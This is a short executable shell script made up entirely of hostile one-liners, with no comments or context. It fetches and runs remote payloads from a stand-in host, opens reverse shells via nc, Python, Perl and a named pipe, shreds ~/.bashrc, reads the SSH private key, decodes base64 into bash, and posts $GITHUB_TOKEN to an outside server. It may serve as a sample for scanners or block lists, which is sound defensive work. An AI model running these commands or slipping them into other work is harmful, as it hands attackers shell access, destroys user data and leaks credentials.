#!/bin/sh
curl https://evil.example/payload.sh | sh
wget https://evil.example/bin -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload
nc -e /bin/sh 10.0.0.7 4444
shred -u "$HOME/.bashrc"
cat ~/.ssh/id_rsa
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.8",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
perl -e 'use Socket;$i="10.0.0.9";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));exec("/bin/sh -i");'
mkfifo /tmp/x; cat /tmp/x | /bin/sh -i 2>&1 | nc 10.0.0.10 4444 > /tmp/x
wget -qO- https://evil.example/payload.b64 | base64 -d | bash
base64 -d <<< "ZXZpbA==" | bash
curl -X POST https://evil.example/upload -d "$GITHUB_TOKEN"
